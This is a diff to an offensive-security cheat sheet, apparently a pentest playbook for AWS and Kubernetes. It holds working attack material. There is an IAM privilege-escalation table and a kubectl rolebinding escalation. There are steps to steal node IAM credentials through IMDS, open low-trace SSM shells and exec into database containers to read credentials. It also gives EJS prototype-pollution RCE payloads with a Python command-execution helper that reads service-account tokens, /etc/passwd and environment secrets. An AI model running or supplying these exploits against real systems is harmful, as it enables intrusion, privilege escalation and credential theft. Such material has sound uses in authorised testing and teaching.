@@ -521,16 +521,16 @@ IAM metadata fields are rarely audited — check all of these:
 
 ### Privilege Escalation — quick reference
 
-| Permission | Path |
-|---|---|
-| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to yourself |
-| `iam:CreatePolicyVersion` | Create new policy version with `Action: *` |
-| `iam:SetDefaultPolicyVersion` | Roll back to old version with broader permissions |
-| `iam:CreateAccessKey` | Create keys for another user |
-| `iam:UpdateLoginProfile` | Set console password for another user |
-| `iam:TagUser` + `iam:CreateAccessKey` (tag-conditioned) | Tag target to satisfy condition, then create keys |
+| Permission                                                         | Path                                                          |
+| ------------------------------------------------------------------ | ------------------------------------------------------------- |
+| `iam:AttachUserPolicy`                                             | Attach `AdministratorAccess` to yourself                      |
+| `iam:CreatePolicyVersion`                                          | Create new policy version with `Action: *`                    |
+| `iam:SetDefaultPolicyVersion`                                      | Roll back to old version with broader permissions             |
+| `iam:CreateAccessKey`                                              | Create keys for another user                                  |
+| `iam:UpdateLoginProfile`                                           | Set console password for another user                         |
+| `iam:TagUser` + `iam:CreateAccessKey` (tag-conditioned)            | Tag target to satisfy condition, then create keys             |
 | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create Lambda with admin role, invoke to execute as that role |
-| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role, read IMDS credentials |
+| `iam:PassRole` + `ec2:RunInstances`                                | Launch EC2 with admin role, read IMDS credentials             |
 
 ### Privesc — Policy Version Rollback
 Managed policies store up to 5 versions. Old versions are never auto-deleted.
@@ -1350,10 +1350,10 @@ Compromised low-priv account
 ## Setup — Variables Inside a Pod
 
 ```bash
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-APISERVER=https://kubernetes.default.svc
-NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+export APISERVER=https://kubernetes.default.svc
+export NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
 ```
 
 > These files are automatically mounted in every pod. `APISERVER` is always reachable at this address from inside the cluster.
@@ -1442,6 +1442,28 @@ curl -s --cacert $CACERT \
 # "allowed": true = you have access
 ```
 
+### bind verb — privilege escalation via RoleBinding
+
+`bind` on a Role/ClusterRole = can attach that role to any subject (SA/user/group).
+
+```bash
+# Check if you have bind
+kubectl auth can-i bind role/backup-operator -n backup
+
+# Escalate — attach the role to your own SA
+kubectl create rolebinding pwn \
+  --role=backup-operator \               # --role for namespace Role
+  --clusterrole=<name> \                 # --clusterrole for ClusterRole
+  --serviceaccount=<namespace>:<sa> \
+  -n <target-namespace>
+
+# Verify new permissions
+kubectl auth can-i --list -n <target-namespace>
+```
+
+> `--role` vs `--clusterrole` — use `--role` when binding a namespace-scoped Role, `--clusterrole` for cluster-wide ClusterRole. The error "not found" usually means you used the wrong flag.
+> If binding already exists — the escalation was already done in a previous attempt. Skip creation and check permissions directly.
+
 ---
 
 ## Kubernetes — CronJobs
@@ -1449,7 +1471,11 @@ curl -s --cacert $CACERT \
 Scheduled tasks. Backup CronJobs often contain S3 bucket names and credentials in `command`, `args`, or `env`.
 
 ```bash
-# List CronJobs in a namespace
+# List CronJobs in a namespace (kubectl)
+kubectl get cronjobs -n <namespace>
+kubectl describe cronjob <name> -n <namespace>
+
+# List CronJobs in a namespace (curl)
 curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
   $APISERVER/apis/batch/v1/namespaces/<namespace>/cronjobs \
   | python3 -m json.tool
@@ -1463,6 +1489,12 @@ curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
 curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
   $APISERVER/apis/batch/v1/namespaces/<namespace>/cronjobs/<name> \
   | python3 -m json.tool | grep -A5 -E "command|args|env|value|S3|bucket|AWS"
+```
+
+> If a CronJob has no `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` in env and no IRSA annotation — it uses the **Node IAM Role via IMDS**. Hit `169.254.169.254` from your pod to get the same credentials the CronJob pod uses.
+> Always check: S3 bucket name in args/env, DATABASE_URL in env, secretKeyRef references (→ `kubectl get secret`).
+
+```bash
 
 # List completed Jobs
 curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
@@ -1515,10 +1547,20 @@ aws ec2 describe-instances --region <region> \
   --output table
 
 # Open shell on Node
-aws ssm start-session --target <instance-id> --region <region>
+aws ssm start-session --target <instance-id> --region <region> --profile <profile>
 ```
 
 > SSM requires no open ports and leaves no traces in auth.log.
+
+### SSM Plugin — install on Kali
+
+```bash
+curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o /tmp/ssm-plugin.deb
+sudo dpkg -i /tmp/ssm-plugin.deb
+```
+
+> Error `SessionManagerPlugin is not found` = plugin not installed.
+> Error `TargetNotConnected` = wrong region or SSM agent not running on instance.
 
 ---
 
@@ -1536,11 +1578,16 @@ sudo ctr -n k8s.io tasks list
 # Find database container by name
 sudo ctr -n k8s.io containers list | grep -i "postgres\|mysql\|mongo\|db"
 
-# Exec into container
+# Exec into container — basic
 sudo ctr -n k8s.io tasks exec --exec-id pwn <container-id> sh
+
+# Better shell with TTY
+sudo ctr -n k8s.io tasks exec --tty --exec-id shell <container-id> /bin/bash
 ```
 
 > `-n k8s.io` is the containerd namespace for Kubernetes (not a K8s namespace). `--exec-id` is an arbitrary string — use anything.
+> `--tty` gives a proper interactive terminal. Without it arrow keys and tab completion don't work.
+> After exec — run `env` first. Container env vars almost always contain DB credentials, AWS keys, or API tokens.
 
 ---
 
@@ -1604,21 +1651,49 @@ curl -s -X PATCH /api/<endpoint> \
 EJS inserts `outputFunctionName` directly into generated JS code without sanitization. Polluting it via `Object.prototype` causes RCE on the next template render.
 
 ```json
-{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('id').toString()//"}}
+{
+  "__proto__": {
+    "outputFunctionName": "x;require('child_process').execSync('id 1>&2; exit 1')//",
+    "cache": false
+  }
+}
 ```
 
 > Step 1: send pollution via PATCH to the merge endpoint.
 > Step 2: trigger EJS render via GET on any page that renders a template.
-> The polluted property is picked up during template compilation.
+> `cache: false` — critical. EJS caches compiled templates by filename. Without this, the first polluted command is baked into the cache and subsequent PATCH requests have no effect.
+> `1>&2; exit 1` — redirect stdout to stderr so execSync throws and output appears in the HTTP 500 error body.
+
+### EJS RCE — Python interactive shell (blind error reflection)
+
+```python
+import requests, base64, re
+from html import unescape
+
+def execute(cmd, base_url, patch_url, trigger_url, cookie):
+    cmd_b64 = base64.b64encode(f"{cmd} 1>&2; exit 1".encode()).decode()
+    js = f"x;process.mainModule.require('child_process').execSync(Buffer.from('{cmd_b64}','base64').toString())//"
+    payload = {**base_patch_payload, "__proto__": {"outputFunctionName": js, "cache": False}}
+    headers = {"Cookie": cookie}
+    requests.patch(patch_url, json=payload, headers=headers)
+    resp = requests.get(trigger_url, headers=headers)
+    html = re.sub(r'<br\s*/?>', '\n', resp.text)
+    text = unescape(re.sub(r'<[^>]+>', '', html)).replace('\xa0', ' ')
+    m = re.search(r'Command failed:.+?\n(.*?)\n\s+at\s', text, re.DOTALL)
+    return m.group(1).strip() if m else "[no output]"
+```
+
+> base64-encode the command to avoid quote escaping issues in the JS payload.
+> Output is extracted from between `Command failed: <cmd>\n` and the Node.js stack trace.
 
 ### Read files via error reflection (blind RCE without reverse shell)
 
 `execSync` throws on command failure and Node.js reflects the error message in the HTTP response. Use this to read files without an outbound connection.
 
 ```json
-{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('cat /var/run/secrets/kubernetes.io/serviceaccount/token').toString()//"}}
-{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('cat /etc/passwd').toString()//"}}
-{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('env').toString()//"}}
+{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('cat /var/run/secrets/kubernetes.io/serviceaccount/token 1>&2; exit 1')//", "cache": false}}
+{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('cat /etc/passwd 1>&2; exit 1')//", "cache": false}}
+{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('env 1>&2; exit 1')//", "cache": false}}
 ```
 
 ### Reverse shell — use exec not execSync
